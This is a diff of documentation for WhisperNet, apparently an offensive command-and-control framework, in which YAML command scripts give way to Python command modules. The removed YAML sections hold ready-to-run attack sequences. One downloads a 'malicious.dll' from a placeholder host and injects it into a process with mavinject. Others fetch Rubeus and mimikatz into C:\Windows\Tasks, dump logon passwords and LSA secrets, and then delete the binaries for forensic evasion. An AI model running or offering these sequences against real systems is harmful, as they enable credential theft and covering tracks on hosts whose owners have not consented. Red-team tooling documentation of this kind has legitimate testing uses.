@@ -1,303 +1,219 @@
-# **Building Your Own Command Scripts**  
+# **Building Your Own Python Command Scripts**
 
-WhisperNet’s YAML-based system is designed for flexibility and modularity, allowing you to create structured command sequences tailored to your needs. This section provides a technical deep dive into structuring, executing, and optimizing your own scripts.
+WhisperNet now supports extending commands using **Python modules**. This approach is designed for flexibility and modularity, allowing you to define command sequences using standard Python classes. This section provides a technical deep dive into structuring, executing, and optimizing your own command scripts.
 
-Note: This isn’t a full-fledged scripting language—there are no variables or advanced logic, just a structured way to define and execute commands in sequence.
-
----
-
-## **YAML Structure Overview**  
-
-Each script follows a strict hierarchy:  
-
-```yaml
-commands:
-  - name: <command_name>
-    description: "<brief description>"
-    steps:
-      - action: <action_type>
-        args: ["<arg1>", "<arg2>", ...]
-```
-
-### **Key Elements:**
-1. **`name`** → The identifier for the command. Must be unique.  
-2. **`description`** → A short explanation of what the command does.  
-3. **`steps`** → A list of execution steps, each defined by:  
-   - **`action`** → The actual command to run (e.g., `shell`, `upload`, `get_file`).  
-    - Also refered to as the `command`, such as in the HTTP comms section
-   - **`args`** → A list of arguments passed to the action, formatted as an array.  
+> **Note:** This isn’t a full scripting language—rather, it’s a modular, object‑oriented way to define commands. Each command is implemented as a Python class that inherits from a common base class and implements a standardized interface.
 
 ---
 
-## **Execution Flow**  
+## **Python Module Structure Overview**
 
-WhisperNet processes each script dynamically:
-
-1. **Command Validation** 
-
-    - The provided command name is matched against the YAML configuration.  
-    - If no match is found, it is assumed that the command is not in the script, and instead on the agent itself.
-        
-        - (ex, `shell whoami` would passthrough to the agent itself) 
-
-2. **Step Execution**  
-
-    - Each `step` is processed **in order**.  
-    - The `action` is mapped to a core function inside the agent.  
-    - The `args` are formatted into a single **space-separated string** for execution.  
-
----
-
-## **Step Execution: How the String is Processed**
-Each step undergoes transformation from **structured YAML** to **an execution-ready command string**.  
-
-### **Example Input in YAML**
-```yaml
-steps:
-  - action: shell
-    args: ["whoami /all"]
-
-  - action: get_file
-    args: ["http://someip/malicious.dll", "C:\\malicious.dll"]
-
-  - action: start-process
-    args: ["mavinject", "<PID>", "/INJECTRUNNING", "C:\\malicious.dll"]
-```
-
-### **Processing in Python**
-Each step is extracted, formatted, and converted into a command string:
+Each command module is a standalone Python file that contains one or more command classes. Every command class must extend the core `BaseCommand` and define two key attributes:
+  
 ```python
-for step in command_steps:
-    action = step.get("action")
-    args = step.get("args", [])
-    args_str = " ".join(args) if isinstance(args, list) else str(args)
-    full_command = f"{action} {args_str}".strip()
-    command_queue_list.append(full_command)
+command_name = "<unique_command_identifier>"
+command_help = "<brief usage description>"
 ```
 
-### **Transformation Steps**
-| **Step**            | **Original (YAML)**                              | **Extracted (Python Dict)**                            | **Formatted String**                         |
-|---------------------|-------------------------------------------------|------------------------------------------------------|---------------------------------------------|
-| **Step 1**         | `shell ["whoami /all"]`                          | `{"action": "shell", "args": ["whoami /all"]}`      | `"shell whoami /all"`                       |
-| **Step 2**         | `get_file ["http://someip/malicious.dll", "C:\\malicious.dll"]` | `{"action": "get_file", "args": ["http://someip/malicious.dll", "C:\\malicious.dll"]}` | `"get_file http://someip/malicious.dll C:\\malicious.dll"` |
-| **Step 3**         | `start-process ["mavinject", "<PID>", "/INJECTRUNNING", "C:\\malicious.dll"]` | `{"action": "start-process", "args": ["mavinject", "<PID>", "/INJECTRUNNING", "C:\\malicious.dll"]}` | `"start-process mavinject <PID> /INJECTRUNNING C:\\malicious.dll"` |
+Additionally, each class must implement:
+- **`__init__`**: Accepts the command string, an arguments list, and an agent ID.
+- **`run()`**: Contains the logic to execute the command.
 
----
+### **Example: PingHost Command Module**
 
-## **Examples**  
+```python
+from modules.agent_script_interpreter import BaseCommand
+from modules.agent import BaseAgent
 
-### **1. Shell Command Execution**  
-Used for running system commands directly.  
+class PingHost(BaseCommand):
+    command_name = "ping_host"
+    command_help = "Pings a host. Usage: `ping_host <host ip/hostname>`"
 
-#### **Example: Running Recon Commands**  
-```yaml
-commands:
-  - name: recon
-    description: "Gather system information"
-    steps:
-      - action: shell
-        args: ["whoami /all"]
+    def __init__(self, command, args_list, agent_id):
+        """
+        command: The command string, e.g. "ping_host"
+        args_list: List of arguments provided by the user.
+                   For example, if the user types `ping_host 127.0.0.1`,
+                   then args_list = ["127.0.0.1"]
+        agent_id: The agent identifier to operate on.
+        """
+        super().__init__(command, args_list, agent_id)
+        if not command:
+            raise ValueError("Missing command")
+        if not args_list:
+            raise ValueError("Missing args_list")
+        if not agent_id:
+            raise ValueError("Missing agent_id")
 
-      - action: shell
-        args: ["ipconfig /all"]
+        # Extract the target host from the arguments.
+        self.host = args_list[0]
 
-      - action: shell
-        args: ["netstat -ano"]
-```
-🔹 **Execution Output:**  
-```
-shell whoami /all
-shell ipconfig /all
-shell netstat -ano
-```
+        # Instantiate BaseAgent to interact with the target agent.
+        self.agent_class = BaseAgent(agent_id)
 
----
+    def run(self):
+        # Optionally, invoke a base method to add delays.
+        # self.set_sleep(2)
 
-### **2. File Download & Execution**  
-Used for retrieving and running payloads.  
+        # Build the ping command.
+        cmd = f"shell ping {self.host}"
 
-#### **Example: Download and Inject a DLL**  
-```yaml
-commands:
-  - name: inject_dll
-    description: "Download and inject a DLL into a running process"
-    steps:
-      - action: get_file
-        args: ["http://someip/malicious.dll", "C:\\malicious.dll"]
+        # Enqueue the command for execution (returns a command ID).
+        shell_cmd_id = self.agent_class.enqueue_command(cmd)
 
-      - action: start-process
-        args: ["mavinject", "<PID>", "/INJECTRUNNING", "C:\\malicious.dll"]
-```
-🔹 **Execution Output:**  
-```
-get_file http://someip/malicious.dll C:\malicious.dll
-start-process mavinject <PID> /INJECTRUNNING C:\malicious.dll
+        # Retrieve the command response (may require waiting/polling).
+        shell_cmd_response = (self.agent_class.get_one_command_and_response(shell_cmd_id) or {}) \
+                                .get("response", None)
+
+        # If a successful reply is detected, process further.
+        if shell_cmd_response and "Reply from 127.0.0.1" in shell_cmd_response:
+            print("Successful Execution")
+            # Append additional details to the response.
+            shell_cmd_response += "\n\nTesting Adding onto command, etc"
+            self.agent_class.store_response(shell_cmd_id, shell_cmd_response)
 ```
 
 ---
 
-### **3. Sleep & Timing Control**  
-Used to change the checkin time of the agent.
+## **Execution Flow**
 
-A nice trick for if you need the commands to run faster, and not take forever, is to just pop some sleep commands in there to change the checkin timing
+1. **Dynamic Loading & Registration**
 
-#### **Example: Modify Sleep Timing**  
-```yaml
-commands:
-  - name: timed_execution
-    description: "Run commands with shorter checkin times"
-    steps:
-      - action: sleep
-        args: [2]  # Shrink sleep to 2 seconds
+   - A command factory or loader scans your designated directory for Python files.
+   - Each module is imported dynamically, and all classes inheriting from `BaseCommand` are registered using their `command_name` attribute.
+   - This allows WhisperNet to discover and execute new command modules without any hardcoded updates.
 
-      - action: shell
-        args: ["dir C:\\"]
+2. **Command Invocation**
 
-      - action: shell
-        args: ["dir D:\\"]
+   - The user inputs a command string (e.g., `ping_host 127.0.0.1`).
+   - The input is split into the command (`ping_host`) and its arguments (`["127.0.0.1"]`).
+   - The factory instantiates the appropriate command class with the command, arguments, and agent ID.
+   - The `run()` method of the instantiated command is called to execute the command.
 
-      - action: sleep
-        args: [10]  # crank it back up at the end of the script
+---
+
+## **Dynamic Module Loading Example**
+
+Below is a sample command factory that loads command modules, registers command classes, and creates command instances dynamically:
+
+```python
+import importlib.util
+import inspect
+import os
+from modules.agent_script_interpreter import BaseCommand
+
+class CommandFactory:
+    def __init__(self):
+        self.commands = {}
+
+    def load_command_module(self, module_path):
+        if not os.path.exists(module_path):
+            raise FileNotFoundError(f"Module not found: {module_path}")
+        module_name = os.path.splitext(os.path.basename(module_path))[0]
+        spec = importlib.util.spec_from_file_location(module_name, module_path)
+        module = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(module)
+        self._register_commands_from_module(module)
+
+    def _register_commands_from_module(self, module):
+        # Iterate over all classes defined in the module.
+        for name, cls in inspect.getmembers(module, inspect.isclass):
+            # Register subclasses of BaseCommand (ignore BaseCommand itself).
+            if issubclass(cls, BaseCommand) and cls is not BaseCommand:
+                if hasattr(cls, 'command_name'):
+                    command_name = getattr(cls, 'command_name')
+                    self.commands[command_name] = cls
+                    print(f"Registered command: {command_name}")
+                else:
+                    print(f"Warning: {name} does not define a command_name attribute")
+
+    def create_command(self, command_name, args, agent_id):
+        command_cls = self.commands.get(command_name)
+        if command_cls is None:
+            raise ValueError(f"Command '{command_name}' is not registered")
+        # Instantiate the command with the proper parameters.
+        return command_cls(command_name, args, agent_id)
 ```
-🔹 **Execution Output:**  
+
+---
+
+## **Best Practices for Custom Python Command Scripts**
+
+### **Keep Commands Modular**
+- **Separation of Concerns:**  
+  Define each command in its own module to keep code maintainable.
+- **Granular Functionality:**  
+  Break complex operations into smaller, dedicated commands.
+
+### **Error Handling and Logging**
+- **Robust Exception Management:**  
+  Use Python’s exception handling within your `run()` method to manage errors gracefully.
+- **Detailed Logging:**  
+  Integrate logging to trace command execution and assist with debugging.
+
+### **Testing and Validation**
+- **Unit Testing:**  
+  Write tests for individual command modules to ensure expected behavior.
+- **Input Validation:**  
+  Validate inputs in the `__init__` method to prevent runtime errors.
+
+### **Operational Security (OPSEC)**
+- **Sensitive Data:**  
+  Be cautious with logging sensitive command outputs.
+- **Execution Modes:**  
+  Consider using synchronous execution for dependent tasks to ensure commands complete in sequence.
+
+---
+
+## **Integrating Python Command Scripts with the Agent**
+
+With dynamic module loading, WhisperNet automatically loads your command scripts before each command is executed. This means:
+
+1. **Immediate Application:**  
+   Any changes or additions to command modules take effect instantly without restarting the agent.
+
+2. **Dynamic Dispatch:**  
+   The agent uses the command factory to look up, instantiate, and execute the correct command based on user input.
+
+3. **Consistent Execution Flow:**  
+   Each command follows a standardized flow—from initialization and validation to execution and response handling.
+
+---
+
+## Examples:
+
+### Populate data fields/get some basic info on a host.
+
 ```
-sleep 2
-shell dir C:\
-shell dir D:\
-sleep 10
-```
+class Populate(BaseCommand):
+    command_name = "populate"
+    command_help = "Populates common data fields. Usage: `populate`"
 
-### **4. Sync & Async**
+    def __init__(self, command, args_list, agent_id):
+        """
+        command: The command string, e.g. "populate"
+        args_list: List of arguments provided by the user (not used here)
+        agent_id: The agent identifier to operate on.
+        """
+        super().__init__(command, args_list, agent_id)
+        if not agent_id:
+            raise ValueError("Missing agent_id")
+        # Instantiate a BaseAgent to handle command execution.
+        self.agent_class = BaseAgent(agent_id)
 
-This example demonstrates how to use synchronous and asynchronous execution modes to manage dependencies between commands. It shows a scenario where a file needs to be downloaded, extracted, and then processed. Synchronous mode ensures each step completes before the next one begins, preventing errors that could occur if steps overlap, such as attempting to extract a partially downloaded file.
-
-Switching to synchronous mode is highly recommended for tasks with variable execution times or dependencies. While long sleep/checkin times *could* be used to approximate this behavior, they do not *guarantee* that tasks will complete successfully if they depend on previous steps. Synchronous mode provides that guarantee.
-
-```yaml
-commands:
-  - name: download_and_process
-    description: "Download a file and process it synchronously"
-    steps:
-      - action: execution_mode
-        args: ["sync"]  # Switch to synchronous mode
-
-      - action: http_get
-        args: ["[http://example.com/large_file.zip](http://example.com/large_file.zip)", "C:\\temp\\large_file.zip"] 
-
-      - action: shell
-        args: ["unzip C:\\temp\\large_file.zip -d C:\\temp\\extracted"] 
-
-      - action: shell
-        args: ["process_data.exe C:\\temp\\extracted\\data.txt"]  
-
-      - action: execution_mode
-        args: ["async"] # Switch back to asynchronous mode (optional)
-```
-
-### **5. Full Example**
-Here's an example script for pulling some tools down:
-
-```
-commands:
-  - name: ghostpack_execute
-    description: "Download and execute a GhostPack tool"
-    steps:
-      # Reduce sleep time for faster check-in
-      - action: sleep
-        args: [10]
-
-      - action: execution_mode # flip to sync so the download completes before running the next command
-        args: ['sync']
-
-      # Download the GhostPack tool (e.g., Rubeus.exe)
-      - action: http_get
-        args: ["https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/Rubeus.exe", "C:\\Windows\\Tasks\\sometool.exe"]
-
-      # Execute the tool using shell command
-      - action: shell
-        args: ["C:\\Windows\\Tasks\\sometool.exe dump"]
-
-      # Delete the tool after execution to reduce forensic footprint
-      - action: delete_file
-        args: ["C:\\Windows\\Tasks\\sometool.exe"]
-
-      - action: execution_mode
-        args: ['async']
-
-      # Restore sleep time
-      - action: sleep
-        args: [10]
+    def run(self):
+        # Enqueue a sleep command (10 seconds) before execution.
+        self.agent_class.enqueue_command("sleep 10")
         
-  - name: mimikatz_cred_dump
-    description: "Download and execute Mimikatz to dump credentials"
-    steps:
-      # Reduce sleep time for faster check-in
-      - action: sleep
-        args: [10]
-
-      - action: execution_mode # flip to sync so the download completes before running the next command
-        args: ['sync']
-
-      # Download Mimikatz to a less suspicious location
-      - action: http_get
-        args: ["https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe", "C:\\Windows\\Tasks\\mimi.exe"]
-
-      # Extract logon passwords
-        action: shell
-        args: ["C:\\Windows\\Tasks\\mimi.exe privilege::debug sekurlsa::logonpasswords exit"]
-
-      # Extract LSA secrets
-        action: shell
-        args: ["C:\\Windows\\Tasks\\mimi.exe privilege::debug sekurlsa::secrets exit"]
-
-
-      # Delete the Mimikatz binary and output file for forensic evasion
-      - action: delete_file
-        args: ["C:\\Windows\\Tasks\\mimi.exe"]
-
-      - action: execution_mode
-        args: ['async']
-
-      # Restore sleep time to normal
-      - action: sleep
-        args: [10]
-
-
-
+        # Execute shell command "ver"
+        self.agent_class.enqueue_command("shell ver")
+        
+        # Execute shell command "whoami"
+        self.agent_class.enqueue_command("shell whoami")
+        
+        # Execute shell command "hostname"
+        self.agent_class.enqueue_command("shell hostname")
+        
+        # Enqueue a sleep command (10 seconds) after execution.
+        self.agent_class.enqueue_command("sleep 10")
 ```
-
-
----
-
-## **Best Practices for Custom Scripts**  
-
-### **Keep Commands Modular**  
-- Break down complex actions into multiple **smaller actions** instead of having one massive YAML file.
-- Example: Instead of one `deploy_payload`, create separate `upload_payload` and `execute_payload` scripts.
-
-<!-- ### ✅ **Leverage Variables for Flexibility**  
-- Hardcoded values like `C:\\temp\\payload.bin` can be **parameterized** to make scripts reusable.  
-- Example:
-  ```yaml
-  - action: upload
-    args: ["{{payload_path}}", "/var/www/html/payload.bin"]
-  ```
-  Then, replace `{{payload_path}}` dynamically before execution. -->
-
-### **Handle OPSEC Considerations**  
-- Be mindful of **logged commands** when executing actions like `shell`.  
-- Use `sleep` strategically to **adjust checkin times** when needed.
-
----
-
-## **Integrating Custom Scripts with the Agent**  
-
-Your scripts are dynamically loaded before each command is executed, meaning **no hardcoded updates** to the agent are needed. WhisperNet will:
-
-1. Read the YAML **each time a command is run**.  
-2. Convert **each step** into an execution-ready string.  
-3. Dispatch the formatted command to the agent.  
-
-This ensures that **modifications to scripts take effect immediately** without needing to restart anything.
-
----
